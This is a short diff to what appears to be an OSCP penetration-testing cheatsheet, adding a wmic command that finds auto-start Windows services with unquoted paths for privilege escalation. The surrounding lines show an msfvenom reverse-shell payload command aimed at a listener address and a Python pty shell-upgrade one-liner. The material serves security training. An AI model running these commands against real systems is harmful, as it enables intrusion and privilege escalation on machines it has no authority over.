@@ -32,6 +32,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thre
 
 python -c 'import pty; pty.spawn("/bin/sh")'
 ***
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 # Table Of Content
 - [OSCP Cheatsheet](#oscp-cheatsheet)
